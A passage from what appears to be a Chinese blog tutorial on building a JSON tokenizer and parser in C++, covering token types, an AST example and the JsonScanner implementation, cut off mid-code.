<code>&#39;\\t&#39;</code>)</li>\n<li><code>NUMBER</code>             : 数字，例如<code>3.14</code>、<code>114514</code>、<code>1919.810</code></li>\n<li><code>STRING</code>             : 字符串，例如<code>&quot;xuranus&quot;</code></li>\n<li><code>LITERAL_TRUE</code>       : <code>true</code>字面量</li>\n<li><code>LITERAL_FALSE</code>      : <code>false</code>字面量</li>\n<li><code>LITERAL_NULL</code>       : <code>null</code>字面量</li>\n<li><code>COMMA</code>              : 逗号<code>,</code></li>\n<li><code>COLON</code>              : 冒号<code>:</code></li>\n<li><code>ARRAY_BEGIN</code>        : JSON数组开始符<code>[</code></li>\n<li><code>ARRAY_END</code>          : JSON数组结束符<code>]</code></li>\n<li><code>OBJECT_BEGIN</code>       : JSON对象开始符<code>&#123;</code></li>\n<li><code>OBJECT_END</code>         : JSON对象结束符<code>&#125;</code></li>\n<li><code>EOF_TOKEN</code>          : 标记串末尾EOF</li>\n</ul>\n<p>举个例子：<br><figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;name&quot;</span> : <span class=\"string\">&quot;xuranus&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;age&quot;</span>  : <span class=\"number\">114514</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;skills&quot;</span>: [<span class=\"string\">&quot;Java&quot;</span>, <span class=\"string\">&quot;CPP&quot;</span>, <span class=\"string\">&quot;JS&quot;</span>]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>如果忽略所有的空白符，该JSON字符产长这样：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&quot;name&quot;:&quot;xuranus&quot;,&quot;ID&quot;:114514,&quot;skills&quot;:[&quot;Java&quot;,&quot;CPP&quot;,&quot;JS&quot;]&#125;</span><br></pre></td></tr></table></figure><br>按照上述Token定义，我们对该字符串进行Token解析，可以获得Token流：</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>Token</th>\n<th>Token</th>\n<th>字符串</th>\n<th>数字</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>&#123;</code></td>\n<td>OBJECT_BEGIN</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><code>&quot;name&quot;</code></td>\n<td>STRING</td>\n<td>name</td>\n<td></td>\n</tr>\n<tr>\n<td><code>:</code></td>\n<td>COLON</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><code>&quot;xuranus&quot;</code></td>\n<td>STRING</td>\n<td>xuranus</td>\n<td></td>\n</tr>\n<tr>\n<td><code>,</code></td>\n<td>COMMA</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><code>&quot;ID&quot;</code></td>\n<td>STRING</td>\n<td>ID</td>\n<td></td>\n</tr>\n<tr>\n<td><code>:</code></td>\n<td>COLON</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><code>114514</code></td>\n<td>NUMBER</td>\n<td></td>\n<td>114514</td>\n</tr>\n<tr>\n<td><code>,</code></td>\n<td>COMMA</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><code>&quot;skills&quot;</code></td>\n<td>STRING</td>\n<td>skills</td>\n<td></td>\n</tr>\n<tr>\n<td><code>:</code></td>\n<td>COLON</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><code>[</code></td>\n<td>ARRAY_BEGIN</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><code>&quot;Java&quot;</code></td>\n<td>STRING</td>\n<td>Java</td>\n<td></td>\n</tr>\n<tr>\n<td><code>,</code></td>\n<td>COMMA</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><code>&quot;CPP&quot;</code></td>\n<td>STRING</td>\n<td>CPP</td>\n<td></td>\n</tr>\n<tr>\n<td><code>,</code></td>\n<td>COMMA</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><code>&quot;JS&quot;</code></td>\n<td>STRING</td>\n<td>JS</td>\n<td></td>\n</tr>\n<tr>\n<td><code>]</code></td>\n<td>ARRAY_END</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><code>&#125;</code></td>\n<td>OBJECT_END</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>从Token流可以进一步解析出JSON的AST：</p>\n<p><pre class=\"mermaid\">flowchart TD\n  obj1(JsonObject) --> objbegin(OBJECT_BEGIN)\n  obj1 --> pair1(PAIR_1)\n  obj1 --> comma1(COMMA)\n  obj1 --> pair2(PAIR_2)\n  obj1 --> comma2(COMMA)\n  obj1 --> pair3(PAIR_3)\n  pair1 --> str1(STRING)\n  pair1 --> col1(COLON)\n  pair1 --> str2(STRING)\n  pair2 --> str3(STRING)\n  pair2 --> col2(COLON)\n  pair2 --> num1(NUMBER)\n  pair3 --> str4(STRING)\n  pair3 --> col3(COLON)\n  pair3 --> array(JsonArray)\n  array --> arraybegin1(ARRAY_BEGIN)\n  array --> str5(STRING)\n  array --> comma3(COMMA)\n  array --> str6(STRING)\n  array --> comma4(COMMA)\n  array --> str7(STRING)\n  array --> arrayend1(ARRAY_END)</pre><br>明确了原理，接下来就来分别看看<code>JsonScanner</code>和<code>JsonParser</code>的实现。</p>\n<h4 id=\"JsonScanner\"><a href=\"#JsonScanner\" class=\"headerlink\" title=\"JsonScanner\"></a>JsonScanner</h4><p>给<code>JsonScanner</code>将在内部存放一个带解析的JSON字符串<code>std::string m_str</code>并维护一个指向其当前读取位置的的下标索引<code>std::size_t m_pos</code>。<code>JsonScanner</code>将提供一个返回Token的<code>Next()</code>方法供外部调用者调用，返回下一个解析出的Token。</p>\n<p>在上述的13种Token种，数字Token（<code>NUMBER</code>）和字符串Token（<code>STRING</code>）解析起来比较复杂，我们将其解析逻辑放入单独的两个解析方法：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">double</span> <span class=\"title\">GetNumberValue</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"><span class=\"function\">std::string <span class=\"title\">GetStringValue</span><span class=\"params\">()</span></span>;</span><br></pre></td></tr></table></figure><br>他们解析的类型依然由<code>Next()</code>方法返回，但是他们解析出的值需要单独存档在类成员中，可以用<code>std::string m_tmpStrValue</code>和<code>double m_tmpNumberValue</code>来暂存解析出的值，并由以上两个方法返回。其余的11种Token解析基本拥有固定的字面量（例如<code>LITERAL_TRUE</code>就是<code>true</code>、<code>ARRAY_BEGIN</code>就是<code>[</code>，拿到了Token就是拿到了字面量），他们解析起来也较为容易，解析逻辑将在<code>Next()</code>中实现。</p>\n<p>基于以上思路，就可以给出<code>JsonScanner</code>的定义：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JsonScanner</span> &#123;</span></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">enum</span> <span class=\"keyword\">class</span> <span class=\"title\">Token</span> &#123;</span></span><br><span class=\"line\">        WHITESPACE, <span class=\"comment\">// &#x27; &#x27;, &#x27;\\n&#x27;, &#x27;\\r&#x27;, &#x27;\\t&#x27;</span></span><br><span class=\"line\">        NUMBER,</span><br><span class=\"line\">        STRING,</span><br><span class=\"line\">        LITERAL_TRUE, <span class=\"comment\">// true</span></span><br><span class=\"line\">        LITERAL_FALSE, <span class=\"comment\">// false</span></span><br><span class=\"line\">        LITERAL_NULL, <span class=\"comment\">// null</span></span><br><span class=\"line\">        COMMA, <span class=\"comment\">// ,</span></span><br><span class=\"line\">        COLON, <span class=\"comment\">// :</span></span><br><span class=\"line\">        ARRAY_BEGIN, <span class=\"comment\">// [</span></span><br><span class=\"line\">        ARRAY_END, <span class=\"comment\">// ]</span></span><br><span class=\"line\">        OBJECT_BEGIN, <span class=\"comment\">// &#123;</span></span><br><span class=\"line\">        OBJECT_END, <span class=\"comment\">// &#125;</span></span><br><span class=\"line\">        EOF_TOKEN <span class=\"comment\">// mark the end of the json string</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"built_in\">JsonScanner</span>(<span class=\"keyword\">const</span> std::string &amp;str);</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Reset</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\">Token <span class=\"title\">Next</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">double</span> <span class=\"title\">GetNumberValue</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\">std::string <span class=\"title\">GetStringValue</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"keyword\">void</span> <span class=\"title\">RollBack</span><span class=\"params\">()</span> </span>&#123; m_pos = m_prevPos; &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"keyword\">size_t</span> <span class=\"title\">Position</span><span class=\"params\">()</span> </span>&#123; <span class=\"keyword\">return</span> m_pos; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span>:  </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">ScanNextString</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">ScanNextNumber</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">    std::string m_str;</span><br><span class=\"line\">    std::<span class=\"keyword\">size_t</span> m_pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">    std::<span class=\"keyword\">size_t</span> m_prevPos = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    std::string m_tmpStrValue &#123;&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">double</span> m_tmpNumberValue &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure><br>其中<code>Reset()</code>、<code>RollBack()</code>、<code>Position()</code>用于设置当前索引下标的跳转以辅助解析流程，之后再看他们的实现。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">JsonScanner::Reset</span><span class=\"params\">()</span> </span>&#123; m_pos = <span class=\"number\">0</span>; m_prevPos = <span class=\"number\">0</span>; &#125;</span><br></pre></td></tr></table></figure>\n<p>首先看<code>Next()</code>方法，这是Token解析最核心的部分。<code>Next()</code>的任务是返回下一个Token，在解析下一个Token之前一般需要先跳过空白符，空白符（<code>&#39; &#39;</code>、<code>&#39;\\n&#39;</code>、<code>&#39;\\r&#39;</code>、<code>&#39;\\t&#39;</code>）的存在一般只是用于缩进为了方便阅读JSON，而对JSON的解析毫无意义。空白符可以存在<strong>任何两个Token之间</strong>，所以要先跳过空白符。这里提供跳过空白符的实现：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JsonScanner</span> &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//...</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"keyword\">bool</span> <span class=\"title\">IsWhiltespaceToken</span><span class=\"params\">(<span class=\"keyword\">char</span> ch)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (ch == <span class=\"string\">&#x27; &#x27;</span> || ch == <span class=\"string\">&#x27;\\n&#x27;</span> || ch == <span class=\"string\">&#x27;\\r&#x27;</span> || ch == <span class=\"string\">&#x27;\\t&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"keyword\">bool</span> <span class=\"title\">SkipWhitespaceToken</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (m_pos &lt; m_str.<span class=\"built_in\">size</span>() &amp;&amp; <span class=\"built_in\">IsWhiltespaceToken</span>(m_str[m_pos])) &#123;</span><br><span class=\"line\">            m_pos++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> m_pos &lt; m_str.<span class=\"built_in\">size</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure><br>其中<code>SkipWhitespaceToken</code>将会在解析到字符串末尾时返回<code>false</code>。在每次指向<code>Next()</code>都应该检测解析是否结束，如果结束则返回<code>EOF_TOKEN</code>。当拿到下一个非空白符的字符时，就可以开始解析Token了：如果第一个字符是<code>-</code>或者数字，则下一个Token有<strong>可能</strong>是一个数字，此时则调用<code>ScanNextNumber</code>进入数字解析模式；如果当前字符是<code>&quot;</code>，则下一个Token<strong>可能</strong>是一个字符串；如果当前字符串是<code>t</code>、<code>f</code>、<code>n</code>，则下一个Token<strong>可能</strong>是<code>LITERAL_TRUE</code>、<code>LITERAL_FALSE</code>、<code>LITERAL_NULL</code>，他们的Token对应的字面量固定，用<code>ScanLiteral()</code>检测。<code>ScanLiteral()</code>用于检测之后的字符串是否匹配给定的字面量，失败则用<code>Panic</code>抛异常，实现如下：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"keyword\">void</span> <span class=\"title\">Panic</span><span class=\"params\">(<span class=\"keyword\">const</span> <span class=\"keyword\">char</span>* str, ...)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> message[<span class=\"number\">100</span>]; </span><br><span class=\"line\">    va_list args;</span><br><span class=\"line\">    <span class=\"built_in\">va_start</span>(args, str);</span><br><span class=\"line\">    <span class=\"built_in\">vsprintf</span>(message, str, args);</span><br><span class=\"line\">    <span class=\"built_in\">va_end</span>(args);</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> std::<span class=\"built_in\">logic_error</span>(message); </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JsonScanner</span> &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"keyword\">void</span> <span class=\"title\">ScanLiteral</span><span class=\"params\">(<span class=\"keyword\">const</span> std::string&amp; literal, <span class=\"keyword\">int</span> offset)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (m_str.<span class=\"built_in\">compare</span>(m_pos, offset, literal) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        m_pos += offset;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">Panic</span>(<span class=\"string\">&quot;unknown literal token at position = %lu, do you mean: %s ?&quot;</span>, m_pos, literal.<span class=\"built_in\">c_str</span>());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>最后，<code>ARRAY_BEGIN</code>、<code>OBJECT_BEGIN</code>等剩余的Token长度为1，直接用当前字符就能判断并返回。终于，基于以上逻辑，给出<code>Next()</code>的实现：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// return a non space token</span></span><br><span class=\"line\"><span class=\"function\">JsonScanner::Token <span class=\"title\">JsonScanner::Next</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    m_prevPos = m_pos;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (m_str.<span class=\"built_in\">length</span>() &lt;= m_pos || !<span class=\"built_in\">SkipWhitespaceToken</span>()) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Token::EOF_TOKEN;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">char</span> curChar = m_str[m_pos];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">IsDigit</span>(curChar) || curChar == <span class=\"string\">&#x27;-&#x27;</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">ScanNextNumber</span>();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Token::NUMBER;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">switch</span></span> (curChar) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">&#x27;\\&quot;&#x27;</span>:</span><br><span class=\"line\">            <span class=\"built_in\">ScanNextString</span>();</span><br><span class=\"line\">            <span class=\"keyword\">return</span> Token::STRING;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">&#x27;t&#x27;</span>:</span><br><span class=\"line\">            <span class=\"built_in\">ScanLiteral</span>(<span class=\"string\">&quot;true&quot;</span>, <span class=\"number\">4</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> Token::LITERAL_TRUE;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">&#x27;f&#x27;</span>:</span><br><span class=\"line\">            <span class=\"built_in\">ScanLiteral</span>(<span class=\"string\">&quot;false&quot;</span>, <span class=\"number\">5</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> Token::LITERAL_FALSE;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">&#x27;n&#x27;</span>:</span><br><span class=\"line\">            <span class=\"built_in\">ScanLiteral</span>(<span class=\"string\">&quot;null&quot;</span>, <span class=\"number\">4</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> Token::LITERAL_NULL;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">&#x27;[&#x27;</span>:</span><br><span class=\"line\">            m_pos ++;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> Token::ARRAY_BEGIN;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">&#x27;]&#x27;</span>:</span><br><span class=\"line\">            m_pos ++;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> Token::ARRAY_END;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">&#x27;&#123;&#x27;</span>:</span><br><span class=\"line\">            m_pos ++;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> Token::OBJECT_BEGIN;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">&#x27;&#125;&#x27;</span>:</span><br><span class=\"line\">            m_pos ++;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> Token::OBJECT_END;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">&#x27;,&#x27;</span>:</span><br><span class=\"line\">            m_pos ++;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> Token::COMMA;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">&#x27;:&#x27;</span>:</span><br><span class=\"line\">            m_pos ++;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> Token::COLON;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">Panic</span>(<span class=\"string\">&quot;Invalid token at position %lu&quot;</span>, m_pos);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Token::LITERAL_NULL;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>接着来看<code>Next()</code>中用于识别下一个字符串的<code>ScanNextString()</code>方法。<code>ScanNextString()</code>从<strong>当前位置</strong>开始扫描字符串，如果成果就将结果存在<code>m_tmpStrValue</code>中。字符串以<code>&quot;</code>开始、以<code>&quot;</code>结束，由于在调用该方法之前<code>Next()</code>方法总已经扫到了字符串开始的<code>&quot;</code>，接下来扫描字符串也就是要找到下一个<code>&quot;</code>，取其中的值作为字符串值。</p>\n<p>在遍历的过程中需要注意特殊字符的转义。由于JSON序列化后的字符串中特殊字符已经被转义成了占用2字节的字面量，例如<code>&#39;\\n&#39;</code>、<code>&#39;\\r&#39;</code>，或者也可能包含占用5个字符unicode编码字面量，例如<code>\\u1289</code>。在反序列化的过程中需要检测<code>\\</code>字符，将其视为转义字符。当遇到转义符时，将额外读取1个或4个字符。在解析到下一个<code>&quot;</code>时，字符串读取完毕，此时该字符字串是含有转义字符字面量的串，需要再次进行反转义获得原始字符串。</p>\n<p><code>ScanNextString()</code>和字符串反转义实现如下：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">JsonScanner::ScanNextString</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">size_t</span> beginPos = m_pos;</span><br><span class=\"line\">    m_pos ++; <span class=\"comment\">// skip left &quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (m_pos &lt; m_str.<span class=\"built_in\">size</span>() &amp;&amp; m_str[m_pos] != <span class=\"string\">&#x27;\\&quot;&#x27;</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">char</span> curChar = m_str[m_pos ++];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (curChar == <span class=\"string\">&#x27;\\\\&#x27;</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// &quot; quotation mark</span></span><br><span class=\"line\">            <span class=\"comment\">// \\ reverse soildus</span></span><br><span class=\"line\">            <span class=\"comment\">// / sodilus</span></span><br><span class=\"line\">            <span class=\"comment\">// b backspace</span></span><br><span class=\"line\">            <span class=\"comment\">// f formfeed</span></span><br><span class=\"line\">            <span class=\"comment\">// n linefeed</span></span><br><span class=\"line\">            <span class=\"comment\">// r carriage return</span></span><br><span class=\"line\">            <span class=\"comment\">// t horizontal tab</span></span><br><span class=\"line\">            <span class=\"comment\">// u (4 hex digits)</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (m_pos &gt;= m_str.<span class=\"built_in\">size</span>()) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">Panic</span>(<span class=\"string\">&quot;missing token, position: %lu&quot;</span>, m_pos);</span><br><span class=\"line\">                <span class=\"keyword\">return</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">char</span> escapeChar = m_str[m_pos];</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (escapeChar == <span class=\"string\">&#x27;\\&quot;&#x27;</span> || escapeChar == <span class=\"string\">&#x27;r&#x27;</span> || escapeChar == <span class=\"string\">&#x27;f&#x27;</span> || escapeChar == <span class=\"string\">&#x27;n&#x27;</span> ||</span><br><span class=\"line\">                    escapeChar == <span class=\"string\">&#x27;t&#x27;</span> || escapeChar == <span class=\"string\">&#x27;b&#x27;</span> || escapeChar == <span class=\"string\">&#x27;\\\\&#x27;</span> || escapeChar == <span class=\"string\">&#x27;/&#x27;</span>) &#123;</span><br><span class=\"line\">                    m_pos ++;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (escapeChar == <span class=\"string\">&#x27;u&#x27;</span>) &#123;</span><br><span class=\"line\">                    m_pos += <span class=\"number\">4</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (m_pos &gt;= m_str.<span class=\"built_in\">size</span>()) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">Panic</span>(<span class=\"string\">&quot;missing end of string, position: %lu&quot;</span>, beginPos);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    m_pos ++; <span class=\"comment\">// skip right &quot;</span></span><br><span class=\"line\">    std::string rawStr = m_str.<span class=\"built_in\">substr</span>(beginPos + <span class=\"number\">1</span>, m_pos - beginPos - <span class=\"number\">2</span>);</span><br><span class=\"line\">    m_tmpStrValue = util::<span class=\"built_in\">UnescapeString</span>(rawStr);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">std::string <span class=\"title\">util::UnescapeString</span><span class=\"params\">(<span class=\"keyword\">const</span> std::string&amp; str)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    std::string res;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">size_t</span> i = <span class=\"number\">0</span>; i &lt; str.<span class=\"built_in\">size</span>(); ++i) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">char</span> curChar = str[i];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (curChar == <span class=\"string\">&#x27;\\\\&#x27;</span> &amp;&amp; i + <span class=\"number\">1</span> &lt; str.<span class=\"built_in\">size</span>()) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">char</span> escapeChar = str[++i];</span><br><span class=\"line\">            <span class=\"built_in\"><span class=\"keyword\">switch</span></span> (escapeChar) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;&quot;&#x27;</span>:</span><br><span class=\"line\">                    res.<span class=\"built_in\">push_back</span>(<span class=\"string\">&#x27;&quot;&#x27;</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;\\\\&#x27;</span>:</span><br><span class=\"line\">                    res.<span class=\"built_in\">push_back</span>(<span class=\"string\">&#x27;\\\\&#x27;</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;/&#x27;</span>:</span><br><span class=\"line\">                    res.<span class=\"built_in\">push_back</span>(<span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;f&#x27;</span>: &#123;</span><br><span class=\"line\">                    res.<span class=\"built_in\">push_back</span>(<span class=\"string\">&#x27;\\f&#x27;</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;b&#x27;</span>: &#123;</span><br><span class=\"line\">                    res.<span class=\"built_in\">push_back</span>(<span class=\"string\">&#x27;\\b&#x27;</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;r&#x27;</span>: &#123;</span><br><span class=\"line\">                    res.<span class=\"built_in\">push_back</span>(<span class=\"string\">&#x27;\\r&#x27;</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;n&#x27;</span>: &#123;</span><br><span class=\"line\">                    res.<span class=\"built_in\">push_back</span>(<span class=\"string\">&#x27;\\n&#x27;</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;t&#x27;</span>: &#123;</span><br><span class=\"line\">                    res.<span class=\"built_in\">push_back</span>(<span class=\"string\">&#x27;\\t&#x27;</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"built_in\">Panic</span>(<span class=\"string\">&quot;invalid escaped char \\\\%c&quot;</span>, escapeChar);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            res.<span class=\"built_in\">push_back</span>(curChar);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">std::string <span class=\"title\">JsonScanner::GetStringValue</span><span class=\"params\">()</span> </span>&#123; <span class=\"keyword\">return</span> m_tmpStrValue; &#125;</span><br></pre></td></tr></table></figure>\n<p>除了字符串解析，另一个复杂Token的解析就是数字了。JSON中的数字可能是整数，也可能是浮点数；可能带符号，也可能不带符号，浮点数还可能是科学计数法表示。数字解析相关实现如下：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JsonScanner</span> &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"keyword\">bool</span> <span class=\"title\">IsDigit</span><span class=\"params\">(<span class=\"keyword\">char</span> ch)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span 